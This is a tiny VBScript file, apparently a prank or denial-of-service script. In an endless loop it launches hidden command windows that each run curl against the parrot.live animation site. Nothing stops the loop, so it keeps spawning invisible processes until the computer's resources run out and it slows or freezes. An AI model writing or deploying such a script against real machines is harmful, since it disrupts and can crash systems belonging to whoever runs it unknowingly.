While true
Dim p
set p = CreateObject ("Wscript.Shell")
Dim o
o = "cmd /c start cmd /c curl parrot.live"
p.run o, 0, false
Wend
